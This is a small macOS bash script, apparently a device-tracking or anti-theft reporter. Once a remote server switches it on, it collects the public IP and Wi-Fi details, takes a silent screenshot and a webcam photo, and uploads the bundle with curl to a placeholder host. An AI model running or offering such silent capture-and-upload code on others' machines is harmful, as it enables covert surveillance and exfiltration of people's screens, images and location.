#! /bin/bash

DOMAIN=http://www.example.com:3000

check=$(curl -s $DOMAIN/check)

if [ "$check" != "true" ]; then
	echo "reports not activated! exiting ..."
	exit
fi

echo "# Getting Wifi & Network information ..."
ip=$(curl -s ipinfo.io/ip)
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I > tmp_connected.txt
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s > tmp_list.txt

curl -s -d "{\"ip\": \"$ip\"}" -H "Content-Type: application/json" $DOMAIN/tag/ip

echo "# Taking screenshot ..."
screencapture -x tmp_screenshot.png

echo "# Taking camera picture ..."
imagesnap -t 10 -w 1 & sleep 3 && killall imagesnap

echo "# Pack, send & clean up ..."
tar -czf tmp.tar.gz tmp_* snapshot*
curl -s -F "input=@./tmp.tar.gz" $DOMAIN/file/bundles
rm tmp* snapshot*